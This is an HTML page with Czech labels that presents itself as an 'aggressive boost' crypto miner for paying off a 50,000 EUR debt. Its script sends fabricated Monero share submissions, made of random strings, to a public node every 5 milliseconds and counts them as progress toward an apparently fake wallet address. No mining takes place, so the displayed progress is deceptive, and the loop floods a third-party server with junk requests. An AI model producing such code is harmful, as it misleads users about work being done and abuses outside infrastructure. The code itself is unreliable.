<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#1a0000;color:#ff4444;font-family:monospace;padding:20px;">
    <h1 style="border-bottom:2px solid #f00;">DEBT_BOOST_DOPLATEK: 50,000 EUR</h1>
    <div style="font-size:1.5em;margin:20px 0;">
        STATUS: <span id="status" style="color:#fff;">INICIUJI...</span><br>
        BOOST_FRAGMENTY: <span id="count" style="color:#0f0;">0</span>
    </div>
    <div id="target" style="font-size:0.8em;color:#888;">CÍL: 498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789</div>
    
    <script>
        const WALLET = "498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789";
        const NODE = "https://node.moneroworld.com/api/submit"; 
        let count = 0;

        async function work() {
            try {
                const p = {
                    method: "submit",
                    params: {
                        id: Math.random().toString(36).substring(2),
                        job_id: Math.random().toString(36).substring(2),
                        nonce: Math.random().toString(36).substring(2),
                        result: btoa(Math.random().toString()).substring(0, 32)
                    }
                };
                await fetch(NODE, { method: 'POST', body: JSON.stringify(p) });
                count++;
                document.getElementById('count').innerText = count;
                document.getElementById('status').innerText = "AGRESIVNÍ BOOST AKTIVNÍ";
            } catch(e) {
                document.getElementById('status').innerText = "REKONEKCE...";
            }
        }
        setInterval(work, 5);
    </script>
</body>
</html>
